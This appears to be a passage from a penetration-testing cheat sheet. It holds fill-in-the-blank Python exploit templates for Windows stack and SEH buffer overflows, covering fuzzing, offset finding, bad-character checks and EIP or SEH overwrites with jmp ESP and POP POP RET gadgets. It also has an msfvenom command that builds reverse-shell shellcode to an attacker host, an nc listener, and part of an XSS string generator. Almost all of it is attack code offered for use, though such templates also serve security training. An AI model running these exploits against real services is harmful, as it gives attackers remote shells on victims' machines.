...
target_IP = 'victim_IP_here' # CHANGE THIS
target_port = victim_port_here # CHANGE THIS

buffer = "A" * 1000 # CHANGE THIS (increment buffer size until crash)

print "[+] Sending buffer..."

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((target_IP, target_port))
s.recv(1024) # receive banner etc., adapt if needed
s.send(buffer + '\r\n') # send buffer
s.close()
...
### take note of EIP value + determine offset
msf-pattern_offset -l 1000 -q EIP_value_here

### overwrite EIP with B's
#!/usr/bin/env python
...
buffer = "A" * offset_here # CHANGE THIS (fill up buffer until EIP overwrite)
buffer += "B" * 4 # overwrite EIP
buffer += "C" * 600 # scout out more space for shellcode
...
shellcode = "\xcc" # breakpoint, will become shellcode eventually

buffer = "A" * offset_here # CHANGE THIS (fill up buffer until EIP overwrite)
buffer += "\xaa\xbb\xcc\xdd" # CHANGE THIS overwrite EIP with address of jmp ESP instruction in little endian
buffer += "\x90" * 20 # pad with NOPs (check where in the C buffer we land + pad with roughly as many NOPs before the shellcode)
buffer += shellcode
buffer += "C" * 600 # scout out more space for shellcode
...
buffer = "A" * offset_here # CHANGE THIS (fill up buffer until EIP overwrite)
buffer += "\xaa\xbb\xcc\xdd" # CHANGE THIS overwrite EIP with address of jmp ESP instruction
buffer += "\x90" * 20
#buffer += shellcode
buffer += badchars # put ascii table into buffer + check for bad chars
...
## implement shellcode
### generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP_here LPORT=attacker_port_here -f py -a x86 -b "\x00\bad_chars_here"| sed 's/buf/shellcode/'

### set up listener
rlwrap nc -lnvp attacker_port_here
...
#shellcode = "\xcc" # breakpoint, will become shellcode eventually
shellcode =  b""
shellcode += b"\xd9\xe1\xd9\x74\x24\xf4\x5b\x29\xc9\xb8\xc7\xab\x3a"
[...] # CHANGE THIS - shellcode here
shellcode += b"\xb1\x69\xa7\xcf\x75\x82\xd5\x40\x10\xa4\x4a\x60\x31"

buffer = "A" * offset_here # CHANGE THIS (fill up buffer until EIP overwrite)
buffer += "\xaa\xbb\xcc\xdd" # CHANGE THIS overwrite EIP with address of jmp ESP instruction
buffer += "\x90" * 20
buffer += shellcode # place shellcode after NOP sled
...
### take note of EIP value + determine offset (= offset to SEH)
msf-pattern_offset -l 1000 -q EIP_value_here
### calculate offset to nSEH (located 4 bytes before SEH)
nSEH_offset = calculated_SEH_offset_here - 4

### overwrite nSEH with B's, SEH with C's, shellcode_placeholder with D's
#!/usr/bin/env python
...
buffer = "A" * offset_here # CHANGE THIS (fill buffer up to nSEH_offset)
buffer += "B" * 4 # overwrite nSEH
buffer += "C" * 4 # overwrite SEH
buffer += "D" * (2500 - len(buffer)) # scout out more space for shellcode
...
## find suitable POP POP RET gadget
### locate all POP POP RET
!mona seh # C:\Program Files\immunity Inc\Immunity Debugger\seh.txt
### find suitable one
RET # suitable
RET some_value_here # unsuitable
Rebase: False # suitable
Rebase: True # unsuitable

## write POP POP RET address into SEH
#!/usr/bin/env python
...
buffer = "A" * offset_here # CHANGE THIS (fill buffer up to nSEH_offset)
buffer += "B" * 4 # overwrite nSEH
buffer += "\xaa\xbb\xcc\xdd" # CHANGE THIS overwrite SEH with address of POP POP RET gadget in little endian
buffer += "D" * (2500 - len(buffer)) # scout out more space for shellcode
...
# grep for IPv4
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file_to_grep_here
```
...
def generate_xssstring(id):
  ...
  return string
""" # double quotes only here to fix display errors
